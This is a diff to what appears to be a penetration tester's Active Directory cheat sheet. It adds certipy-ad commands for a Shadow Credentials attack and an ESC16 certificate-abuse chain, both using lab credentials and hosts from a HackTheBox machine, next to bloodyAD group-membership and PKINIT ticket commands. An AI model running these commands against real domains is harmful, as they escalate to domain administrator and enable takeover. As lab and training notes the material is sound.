@@ -99,6 +99,13 @@ bloodyAD --host 'dc' -u 'user' -p 'pass' add groupMember 'developers' 'machine1$
 bloodyAD --host 'dc02.abc' -u 'user' -p ':hash' -d 'domain1' add groupMember 'sysadmins' 'gatari$'
 ```
 
+
+## Shadow Credential
+
+```bash
+certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+```
+
 ## Bloodhound
 
 ```bash
@@ -170,4 +177,19 @@ source .venv/bin/activate && \
 uv pip install -r requirements.txt && \
 uv pip install -I git+https://github.com/wbond/oscrypto.git && \
 uv run python gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```
+
+## ESC16
+
+```bash
+# update UPN
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
+
+# request cert
+certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+
+# fixed the previous change
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
+
+certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
 ```
